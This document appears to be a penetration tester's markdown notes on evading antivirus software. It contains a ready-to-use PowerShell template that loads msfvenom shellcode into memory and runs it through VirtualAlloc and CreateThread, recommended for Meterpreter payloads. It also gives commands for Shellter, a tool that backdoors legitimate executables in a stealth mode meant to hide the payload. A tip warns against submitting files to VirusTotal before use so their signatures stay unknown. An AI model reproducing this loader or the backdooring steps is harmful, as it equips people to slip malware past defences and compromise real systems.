## Antivirus Evasion

### Scanning Files

www.virustotal.com lets you upload a file and scan through multiple AV definitions.  Only use if you are ready to use the file, because it will add that file's signature to the definitions eventually.

### Memory Evasion

Can leverage Powershell Scripts due to the fact that it's difficult for AV to figure out if a PS Script is malicious or not because it's run inside an interpreter and the script isn't executable.

Below is a basic script template for in-memory injection.

```powershell
# Import functions needed for exploit from DLL's
$code = '
# This function allows you to allocate memory
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
# This function allows you to create an execution thread
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
# This function allows you to write arbitrary data to memory
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

# 
$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

# Insert shellcode here, use msfvenom format 'powershell'
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

# Allocate memory block
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

# Write shellcode to allocated memory block
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

# Execute in-memory payload in separate thread
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

If you run into issues with the Execution Policy, check the Execution Policy section of the Scripts\Powershell\Powershell.md document.

This is a great script to use a Meterpreter Payload with üí™üèº

### Shellter

This tool installs a backdoor in a legitimate file.  It analyzes a target PE and execution paths to determine where shellcode can be injected, using advanced methods not easily caught by AV.  It also uses existing PE Import Address Table (IAT) entries to find functions that can be used for memory allocation, transfer, and execution of the payload.

NOTE:  Shellter is a Windows tool and requires wine to be installed

#### Install:

```bash
sudo apt install shellter
```

#### To run:

You can technically run shellter with just `shellter` but it will throw permission errors unless you are running it as root as it will try to write to the user directory instead of it's own.  Use this command instead:

```bash
wine wineconsole /usr/share/windows-resources/shellter/shellter.exe
```

#### Creating a Payload

After shellter runs, it presents some choices:

- Operation Mode
  - Manual Mode provides the most customization options
  - Auto mode walks you through the process but may cause issues
- Stealth Mode
  - This will attempt to resume execution after the payload is finished, thereby hiding the payloads existence and reducing suspicion.
- Use a listed payload or custom
  - Choose one of the popular ones or provide your own.
  - To use stealth mode with custom payloads, be sure to use the `EXITFUNC=thread ` option when making the payload in MSFVenom.

